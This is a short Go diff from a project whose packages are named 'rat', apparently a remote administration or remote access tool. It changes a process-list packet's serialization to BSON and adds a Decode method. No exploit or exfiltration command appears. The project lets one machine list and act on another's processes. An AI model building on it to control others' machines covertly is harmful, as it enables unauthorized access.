@@ -1,19 +1,21 @@
 package main
 
 import (
-	"rat/client/process"
 	"rat/client/network/header"
+	"rat/client/process"
 	"rat/client/processes"
+
+	"gopkg.in/mgo.v2/bson"
 )
 
 type Process struct {
-	Path string `network:"receive"`
-	PID  int    `network:"send,receive"`
+	Path string "path"
+	PID  int    "pid"
 }
 
 type ProcessPacket struct {
-	Action    int       `network:"send,receive"`
-	Processes []Process `network:"send,receive"`
+	Action    int       "action"
+	Processes []Process "processes"
 }
 
 func (packet ProcessPacket) Header() header.PacketHeader {
@@ -48,4 +50,9 @@ func (packet ProcessPacket) OnReceive() error {
 	}
 
 	return nil
+}
+
+func (packet ProcessPacket) Decode(buf []byte) (IncomingPacket, error) {
+	err := bson.Unmarshal(buf, &packet)
+	return packet, err
 }
